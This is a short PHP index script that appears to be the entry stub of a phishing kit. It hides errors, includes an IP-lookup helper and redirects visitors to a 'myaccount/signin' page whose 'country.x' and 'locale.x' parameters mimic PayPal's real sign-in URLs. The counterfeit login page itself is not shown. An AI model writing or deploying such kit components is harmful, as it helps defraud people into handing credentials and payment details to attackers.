<?php

session_start();
error_reporting(0);
include('./functions/get_ip.php');

header("LOCATION: myaccount/signin/?country.x=".$_SESSION['_LOOKUP_CNTRCODE_']."&locale.x=en_".$_SESSION['_LOOKUP_CNTRCODE_']."");
?>
